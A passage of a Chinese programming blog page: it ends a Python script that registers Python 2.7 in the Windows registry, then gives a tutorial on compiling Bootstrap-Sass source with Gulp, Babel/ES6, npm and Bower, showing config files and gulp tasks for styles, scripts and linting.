class="params">pythonkey</span>)</span><span class="operator"> == </span>pythonpath):</span><br><span class="line">        <span class="constructor">CloseKey(<span class="params">reg</span>)</span></span><br><span class="line">        print <span class="string">"=== Python"</span>, version, <span class="string">"is already registered!"</span></span><br><span class="line">        return</span><br><span class="line">    <span class="constructor">CloseKey(<span class="params">reg</span>)</span></span><br><span class="line">    print <span class="string">"*** Unable to register!"</span></span><br><span class="line">    print <span class="string">"*** You probably have another Python installation!"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__<span class="operator"> == </span><span class="string">"__main__"</span>:</span><br><span class="line">    <span class="constructor">RegisterPy()</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>用Python 运行register.py后就能识别python2.7了 代码来自：<a href="http://tech.valgog.com/2010/01/after-installing-64-bit-windows-7-at.html" target="_blank" rel="noopener">http://tech.valgog.com/2010/01/after-installing-64-bit-windows-7-at.html</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/huxiao123" class="author" itemprop="url" rel="index">huxiao123</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-07-20 17:02:37" itemprop="dateCreated datePublished" datetime="2016-07-20T17:02:37+08:00">2016-07-20</time>
                </span>
                <span id="/2956.html" class="post-meta-item leancloud_visitors" data-flag-title="python version 2. required,which was not found in the registry 解决方案" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>1.1k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2906.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> JavaScript <i class="label-arrow"></i>
                  </a>
                  <a href="/2906.html" class="post-title-link" itemprop="url">基于ES6利用Gulp编译BootStrap-Sass源码</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="BootStrap"><a href="#BootStrap" class="headerlink" title="BootStrap"></a>BootStrap</h2>
                  <p>BootStrap 是一个前端CSS框架，它提供了一些便捷的组件方便我们快速构建前端页面，目前已经到了版本4，版本4是用 Sass 编写的，版本3是由 Less 编写的，后来增加了 Sass 版本。这说明了什么？BootStrap 已经向 Sass靠近了，个人感觉 Sass 比 Less 更为强大，具有更丰富的语法功能。 所以，Sass 将会成为比 Less 更为主流的语言。 目前常用的 BootStrap 版本是3，在官网也提供了相关 Sass 版本的下载。 在此提供官网下载链接和 Sass 项目 GitHub 地址。 <a href="http://v3.bootcss.com/getting-started/#download" target="_blank" rel="noopener">BootStrap</a> <a href="https://github.com/twbs/bootstrap-sass" target="_blank" rel="noopener">BootStrap-Sass</a> 在 BootStrap 的下载版本中，可以看到有三个。一个是编译好的 JS，CSS 文件，可以直接拿来用，方便快捷就可以下载这个来用。第二个是 Less 源码版本，你可以自己定义 Less 文件，在项目基础上继续用 Less 开发，编译成需要的 CSS 文件。第三个是后来新增的 Sass 版本，本节就以它为例来说明利用 Gulp 编译 BootStrap-Sass 的过程，目的一在于熟悉 Gulp 自动化编译 Sass 的流程，目的二在于了解前端自动化的工作原理。</p>
                  <h2 id="Gulp"><a href="#Gulp" class="headerlink" title="Gulp"></a>Gulp</h2>
                  <p>说完 BootStrap，我们再说下 Gulp，基于 Node.js。它干嘛的呢？就是一个前端自动化工具，什么用处？比如它可以编译 Less，Sass 生成到指定目录文件为 CSS，生成对应 map 文件，可以生成 JavaScript 的 map 文件，自动更新 html 中的 JS，CSS 引用路径，合并多个 JS，CSS 文件为统一整体，最小化压缩 JS，CSS 文件等等，最终目的呢？自动化替代重复劳动，提高效率。 说到 Gulp，就不得不提到它的竞争对手 Grunt，它具有和 Gulp 几乎一样的功能，然而 Grunt 有几个缺点，比如插件职责不明确，产生大量临时文件，语法繁琐等等。相比之下，Gulp插件职责明确，基于流式，不会产生临时文件，语法简单。冲着这几点，果断选择 Gulp。 利用 Gulp，我们就可以在项目中定义一个 gulpfile.babel.js 里面写入需要执行的任务，命令行执行 gulp 命令就可以完成自动化，一些重复的无聊的工作就不要你来做了。 <a href="http://www.gulpjs.com.cn/" target="_blank" rel="noopener">Gulp中文网</a></p>
                  <h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2>
                  <p>说完 Gulp，然后就属 ES6 了，它是 ECMAScript 6 的简称，是 JavaScript 的一个新的版本类型，由于是 2015年发布的，所以也可以叫它 ES2015。我们之前编的 JavaScript 大多数是基于ES5或之前的版本，在 ES6 的基础上增加了许多新的语法特性，比如 Class，let，const 等等。 在 ES5 中，Gulp 的执行文件叫做 gulpfile.js，到了 ES6中，它就叫做 gulpfile.babel.js 了，多了一个 badel，那 babel 又是什么？ 关于 ES6 的新特性预览可以看 <a href="http://es6.ruanyifeng.com/" target="_blank" rel="noopener">ES6</a></p>
                  <h2 id="Babel"><a href="#Babel" class="headerlink" title="Babel"></a>Babel</h2>
                  <p>Babel 其实是一个 JavaScript 编译器，支持 ES6，你可以用新型的 ES6 语法来编写你的 JavaScript，Babel 会为你生成对应的 ES5 的 JavaScript。乍看之下并没有什么关系，所以在这里你可以把 babel 看作 ES6 的代名词，在 Gulp 中，新型的 ES6 语法的 JavaScript 的 gulpfile 名字命名为 gulpfile.babel.js。 <a href="http://babeljs.cn/" target="_blank" rel="noopener">Babel</a></p>
                  <h2 id="NPM"><a href="#NPM" class="headerlink" title="NPM"></a>NPM</h2>
                  <p>有一点 Node.js 基础的想必都知道这一个东西吧，Node Package Manager，Node.js 包管理器，利用它你可以安装 Node.js 的相关包，其中包括 Gulp。可以全局安装，加个 -g 参数，可以局部安装，需要路径下有个 package.json。 NPM怎样安装？安装了 Node.js 就好了。 <a href="https://nodejs.org" target="_blank" rel="noopener">Node.js</a> 如果觉得速度慢，可以安装 CNPM，镜像源来源非国外，是淘宝的一个镜像源，速度快。 <a href="https://npm.taobao.org/" target="_blank" rel="noopener">CMPM</a></p>
                  <h2 id="Bower"><a href="#Bower" class="headerlink" title="Bower"></a>Bower</h2>
                  <p>在这里还需要用到一个工具 bower，类似 NPM，算是前端的一些组件管理工具，一些前端库比如 jquery，bootstrap 等等都可以用 bower 这个工具来下载，需要在根目录下建立一个 bower.json 和 .bowerrc 文件。利用 bower 我们就可以方便地管理前端的工具包了，不用我们去手动下载复制粘贴之类的。</p>
                  <h2 id="WebStorm"><a href="#WebStorm" class="headerlink" title="WebStorm"></a>WebStorm</h2>
                  <p>在这再安利一个 IDE 吧，WebStorm，JetBrains公司出的一款强大又良心的编写前端的 IDE，支持各种插件，具有强大的语法提示，支持 JsHint 等代码检查，集成了终端，Git 等等强大的工具，Web 开发不二选择，推荐最新版本。 <a href="https://www.jetbrains.com/webstorm/" target="_blank" rel="noopener">WebStorm</a></p>
                  <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2>
                  <p>扯完以上东西（其实还有好多没有扯完），让我们进入正题吧，正题是什么？哦没错，那就是</p>
                  <blockquote>
                    <p>基于 ES6 语法使用 Gulp 编写 gulpfile.babel.js 来编译 BootStrap-Sass 源码。</p>
                  </blockquote>
                  <p>下面是一些准备工作，没有做好的小伙伴请按照步骤一一完成。</p>
                  <h3 id="安装-Node-js-和-NPM"><a href="#安装-Node-js-和-NPM" class="headerlink" title="安装 Node.js 和 NPM"></a>安装 Node.js 和 NPM</h3>
                  <p>从 Node 的官网下载 Node 并安装，安装流程不详细说明，安装完成之后 NPM 随之就会安装成功。 命令行下输入 npm 检查一下是否可以正常运行。</p>
                  <h3 id="安装-Gulp"><a href="#安装-Gulp" class="headerlink" title="安装 Gulp"></a>安装 Gulp</h3>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">npm <span class="keyword">install</span> -g gulp</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>加入 -g 参数是全局安装，安装完成之后你可以在任意位置使用命令。</p>
                  <h3 id="安装-Bower"><a href="#安装-Bower" class="headerlink" title="安装 Bower"></a>安装 Bower</h3>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">npm <span class="keyword">install</span> -g bower</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>依然是全局安装 bower。</p>
                  <h3 id="下载-BootStrap-Sass"><a href="#下载-BootStrap-Sass" class="headerlink" title="下载 BootStrap-Sass"></a>下载 BootStrap-Sass</h3>
                  <p>可直接进入 <a href="http://v3.bootcss.com/getting-started/#download" target="_blank" rel="noopener">BootStrap</a> 页面点击第三个下载 Sass 源码。 也可以用 Git 将 <a href="https://github.com/twbs/bootstrap-sass" target="_blank" rel="noopener">BootStrap-Sass</a> 的项目 clone 下来。</p>
                  <h3 id="安装-WebStorm"><a href="#安装-WebStorm" class="headerlink" title="安装 WebStorm"></a>安装 WebStorm</h3>
                  <p>推荐使用 WebStorm，可以开启 JsHint 等检测工具，具有强大的代码提示功能，不过不使用也没关系。 在你的 IDE 打开下载的项目，</p>
                  <h3 id="新建-gulpfile-babel-js"><a href="#新建-gulpfile-babel-js" class="headerlink" title="新建 gulpfile.babel.js"></a>新建 gulpfile.babel.js</h3>
                  <p>gulpfile.babel.js 是基于 ES6 的 Gulp 处理文件，新建它，稍后所有的工作都在这里完成。</p>
                  <h3 id="新建-babelrc"><a href="#新建-babelrc" class="headerlink" title="新建 .babelrc"></a>新建 .babelrc</h3>
                  <p>新建 .babelrc 文件，内容</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"presets"</span>: [</span><br><span class="line">    <span class="string">"es2015"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这是指定 gulp 使用最新标准的 JavaScript 进行编译。</p>
                  <h3 id="新建-bowerrc"><a href="#新建-bowerrc" class="headerlink" title="新建 .bowerrc"></a>新建 .bowerrc</h3>
                  <p>新建 .bowerrc 文件，这是 bower 的配置文件，可以指定路径等相关配置，内容为</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"directory"</span>: <span class="string">"bower_components"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这是指定 bower 工具下载前端组件时会默认下载到这个文件夹中。</p>
                  <h3 id="修改-bower-json"><a href="#修改-bower-json" class="headerlink" title="修改 bower.json"></a>修改 bower.json</h3>
                  <p>可以精简 bower.json 文件，比如修改名称，删去 main，ignore 配置等。 比如精简成</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"bootstrap-sass-demo"</span>,</span><br><span class="line">  <span class="attr">"authors"</span>: [</span><br><span class="line">    <span class="string">"Germey"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"bootstrap-sass is a Sass-powered version of Bootstrap, ready to drop right into your Sass powered applications."</span>,</span><br><span class="line">  <span class="attr">"moduleType"</span>: <span class="string">"globals"</span>,</span><br><span class="line">  <span class="attr">"keywords"</span>: [</span><br><span class="line">    <span class="string">"twbs"</span>,</span><br><span class="line">    <span class="string">"bootstrap"</span>,</span><br><span class="line">    <span class="string">"sass"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"jquery"</span>: <span class="string">"&gt;= 1.9.0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>修改 package.json 在进行 Gulp 配置文件编写之前，首先需要引入一些 Node.js 开发包，比如 babel，gulp，wiredep等等。 修改 devDependencies 为</p>
                  <figure class="highlight 1c">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">"devDependencies"</span>: &#123;</span><br><span class="line">    <span class="string">"babel-core"</span>: <span class="string">"^6.4.0"</span>,</span><br><span class="line">    <span class="string">"babel-preset-es2015"</span>: <span class="string">"^6.3.13"</span>,</span><br><span class="line">    <span class="string">"babel-register"</span>: <span class="string">"^6.9.0"</span>,</span><br><span class="line">    <span class="string">"browser-sync"</span>: <span class="string">"^2.2.1"</span>,</span><br><span class="line">    <span class="string">"del"</span>: <span class="string">"^1.1.1"</span>,</span><br><span class="line">    <span class="string">"gulp"</span>: <span class="string">"^3.9.1"</span>,</span><br><span class="line">    <span class="string">"gulp-autoprefixer"</span>: <span class="string">"^3.0.1"</span>,</span><br><span class="line">    <span class="string">"gulp-babel"</span>: <span class="string">"^6.1.1"</span>,</span><br><span class="line">    <span class="string">"gulp-cache"</span>: <span class="string">"^0.2.8"</span>,</span><br><span class="line">    <span class="string">"gulp-cssnano"</span>: <span class="string">"^2.0.0"</span>,</span><br><span class="line">    <span class="string">"gulp-eslint"</span>: <span class="string">"^0.13.2"</span>,</span><br><span class="line">    <span class="string">"gulp-htmlmin"</span>: <span class="string">"^1.3.0"</span>,</span><br><span class="line">    <span class="string">"gulp-if"</span>: <span class="string">"^1.2.5"</span>,</span><br><span class="line">    <span class="string">"gulp-imagemin"</span>: <span class="string">"^2.2.1"</span>,</span><br><span class="line">    <span class="string">"gulp-load-plugins"</span>: <span class="string">"^0.10.0"</span>,</span><br><span class="line">    <span class="string">"gulp-plumber"</span>: <span class="string">"^1.0.1"</span>,</span><br><span class="line">    <span class="string">"gulp-sass"</span>: <span class="string">"^2.0.0"</span>,</span><br><span class="line">    <span class="string">"gulp-size"</span>: <span class="string">"^1.2.1"</span>,</span><br><span class="line">    <span class="string">"gulp-sourcemaps"</span>: <span class="string">"^1.5.0"</span>,</span><br><span class="line">    <span class="string">"gulp-uglify"</span>: <span class="string">"^1.1.0"</span>,</span><br><span class="line">    <span class="string">"gulp-useref"</span>: <span class="string">"^3.0.0"</span>,</span><br><span class="line">    <span class="string">"main-bower-files"</span>: <span class="string">"^2.5.0"</span>,</span><br><span class="line">    <span class="string">"wiredep"</span>: <span class="string">"^2.2.2"</span></span><br><span class="line">  &#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>执行</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">npm <span class="keyword">install</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>安装所需要的库。 如此一来，所有的准备工作就差不多了。</p>
                  <h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2>
                  <h3 id="引入类库"><a href="#引入类库" class="headerlink" title="引入类库"></a>引入类库</h3>
                  <p>首先引入一些必须的类库</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> gulp <span class="keyword">from</span> <span class="string">'gulp'</span>;</span><br><span class="line"><span class="keyword">import</span> gulpLoadPlugins <span class="keyword">from</span> <span class="string">'gulp-load-plugins'</span>;</span><br><span class="line"><span class="keyword">import</span> browserSync <span class="keyword">from</span> <span class="string">'browser-sync'</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">del</span> <span class="keyword">from</span> <span class="string">'del'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;stream <span class="keyword">as</span> wiredep&#125; <span class="keyword">from</span> <span class="string">'wiredep'</span>;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>gulp 自不必多说，是 gulp 必须的核心类库。 gulp-load-plugins 是加载 gulp 插件的类库，我们知道 gulp 插件非常丰富，如果要一个个引入的话，需要写很多很多条 import 语句，引入了这个插件之后，调用时只需要加 点(.) + 插件名称 那就可以使用了。 browser-sync 是浏览器同步工具，如果有代码更新，浏览器会自动刷新更新资源。 del 是删除资源的工具包。 wiredep 是从 bower 同步到 html 中资源引用的插件，bower 中定义了依赖包，有了它，这些包的引用比如 js，css 就可以直接自动生成到 html 文件中。 接着初始化一些变量。</p>
                  <figure class="highlight actionscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> $ = gulpLoadPlugins();</span><br><span class="line"><span class="keyword">const</span> reload = browserSync.reload;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>将加载插件的插件初始化为 $ 符号，然后初始化 reload 等变量。</p>
                  <h3 id="Sass-编译"><a href="#Sass-编译" class="headerlink" title="Sass 编译"></a>Sass 编译</h3>
                  <p>下载好 Sass 源码之后，打开 assets/stylesheets 目录，可以看到 BootStrap 的 Sass 源代码。不过发现文件名都是 _ 开头的，这种类型的文件是不能被编译生成的，所以新建一个 bootstrap.sass 文件，内容为</p>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">@import</span> <span class="string">"_bootstrap"</span>;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>最后生成的目录结构如下</p>
                  <figure class="highlight 1c">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">|_____bootstrap-compass.scss</span></span><br><span class="line"><span class="string">|_____bootstrap-mincer.scss</span></span><br><span class="line"><span class="string">|_____bootstrap-sprockets.scss</span></span><br><span class="line"><span class="string">|_____bootstrap.scss</span></span><br><span class="line"><span class="string">|____bootstrap</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>接下来我们只需要编译 bootstrap.scss 即可。 定义一个路径配置</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">const styles</span> = &#123;</span><br><span class="line">    <span class="string">'in'</span>: <span class="string">'assets/stylesheets/**/*.scss'</span>,</span><br><span class="line">    <span class="string">'tmp'</span>: <span class="string">'.tmp/css'</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>包含 in 和 tmp 目录，in 代表 Sass 源文件地址，tmp 代表生成的编译后的 CSS 目录。 接下来最重要的，指定一个 Gulp Task</p>
                  <figure class="highlight less">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-tag">gulp</span><span class="selector-class">.task</span>(<span class="string">'styles'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="selector-tag">return</span> <span class="selector-tag">gulp</span><span class="selector-class">.src</span>(styles.in)</span><br><span class="line">        <span class="selector-class">.pipe</span>($.plumber())</span><br><span class="line">        <span class="selector-class">.pipe</span>($.sourcemaps.init())</span><br><span class="line">        <span class="selector-class">.pipe</span>($.sass.sync(&#123;</span><br><span class="line">            <span class="attribute">outputStyle</span>: <span class="string">'expanded'</span>,</span><br><span class="line">            <span class="attribute">precision</span>: <span class="number">10</span>,</span><br><span class="line">            <span class="attribute">includePaths</span>: [<span class="string">'.'</span>]</span><br><span class="line">        &#125;).on(<span class="string">'error'</span>, $.sass.logError))</span><br><span class="line">        <span class="selector-class">.pipe</span>($.autoprefixer(&#123;<span class="attribute">browsers</span>: [<span class="string">'&gt; 1%'</span>, <span class="string">'last 2 versions'</span>, <span class="string">'Firefox ESR'</span>]&#125;))</span><br><span class="line">        <span class="selector-class">.pipe</span>($.sourcemaps.write())</span><br><span class="line">        <span class="selector-class">.pipe</span>(gulp.dest(styles.tmp))</span><br><span class="line">        <span class="selector-class">.pipe</span>(reload(&#123;<span class="attribute">stream</span>: true&#125;));</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>task 是 gulp 的一个核心方法，定义了 styles 这个 task 之后，就可以执行</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">gulp styles</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>就可以完成以上定义的任务。 首先利用 gulp.src 引入了需要编译的 Sass 文件，然后利用一系列 pipe 流式管道来指定一系列处理任务。 plumber 是一个错误处理插件，当出现错误时，不会立即卡主，而是进入 plumber，防止程序运行终止。 sourcemaps 是用来生成映射文件的一个插件，map 文件记录了从 Sass 编译成 CSS 的过程中，每一行的 Sass 代码对应哪一行的 CSS 代码。 sass 是核心的编译 Sass 的插件，指定了输出格式 expanded，precision 指定了当输出十进制数字时，使用多少位的精度，然后指定了路径和错误日志。 autoprefixer 是一个以友好方式处理浏览器前缀的插件，比如一些 CSS 的定义会出现 -webkit- 等等，此插件是用来处理浏览器前缀的。</p>
                  <blockquote>
                    <p>Autoprefixer默认将支持主流浏览器最近2个版本，这点类似Google。不过你可以在自己的项目中通过名称或者模式进行选择： 主流浏览器最近2个版本用“last 2 versions”； 全球统计有超过1%的使用率使用“&gt;1%”; 仅新版本用“ff&gt;20”或”ff&gt;=20”. 然后Autoprefixer计算哪些前缀是需要的，哪些是已经过期的。</p>
                  </blockquote>
                  <p>dest 是输出编译后的文件，指定输出路径。 reload 是同步浏览器资源的方法。 定义好如上内容之后，命令行输入</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">gulp styles</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>就会发现出现了 .tmp 目录，里面有 css/bootstrap.css</p>
                  <h3 id="JavaScript-处理"><a href="#JavaScript-处理" class="headerlink" title="JavaScript 处理"></a>JavaScript 处理</h3>
                  <p>同理，定义一个 task，用来处理 JavaScript</p>
                  <figure class="highlight less">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-tag">gulp</span><span class="selector-class">.task</span>(<span class="string">'scripts'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="selector-tag">return</span> <span class="selector-tag">gulp</span><span class="selector-class">.src</span>(scripts.in)</span><br><span class="line">        <span class="selector-class">.pipe</span>($.plumber())</span><br><span class="line">        <span class="selector-class">.pipe</span>($.sourcemaps.init())</span><br><span class="line">        <span class="selector-class">.pipe</span>($.babel())</span><br><span class="line">        <span class="selector-class">.pipe</span>($.sourcemaps.write(<span class="string">'.'</span>))</span><br><span class="line">        <span class="selector-class">.pipe</span>(gulp.dest(scripts.tmp))</span><br><span class="line">        <span class="selector-class">.pipe</span>(reload(&#123;<span class="attribute">stream</span>: true&#125;));</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>相比之下，此处多了一个 babel 插件。 babel 是基于 ES6 标准的一个 JavaScript 插件，它可以对 ES6 版本的代码进行转换，转换成 ES5 标准，避免出现出现 ES6 不兼容问题。 在此处还需要 scripts 的路径定义</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">const scripts</span> = &#123;</span><br><span class="line">    <span class="string">'in'</span>: <span class="string">'assets/javascripts/**/*.js'</span>,</span><br><span class="line">    <span class="string">'tmp'</span>: <span class="string">'.tmp/js'</span>,</span><br><span class="line">    <span class="string">'out'</span>: <span class="string">'dist/js'</span></span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>定义完成之后，执行</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">gulp scripts</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>就可以完成 JavaScript 的转换。 另外还有一个专门负责代码风格转换的 task，使用了 eslint 这个插件</p>
                  <figure class="highlight roboconf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">const lint = &#123;</span><br><span class="line">    '<span class="attribute">in'</span>: 'assets/javascripts/**/*<span class="variable">.js</span>'</span><br><span class="line">&#125;;</span><br><span class="line"><span class="attribute">gulp.task('lint', () =&gt; &#123;</span></span><br><span class="line"><span class="attribute">    return gulp.src(lint.in)</span></span><br><span class="line"><span class="attribute">        .pipe(reload(&#123;stream</span>: true, once: true&#125;))</span><br><span class="line">        <span class="variable">.pipe</span>($<span class="variable">.eslint</span><span class="variable">.format</span>())</span><br><span class="line">        <span class="variable">.pipe</span>($<span class="variable">.if</span>(!browserSync<span class="variable">.active</span>, $<span class="variable">.eslint</span><span class="variable">.failAfterError</span>()));</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>执行</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">gulp lint</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>之后，就可以进行代码风格的标准化。</p>
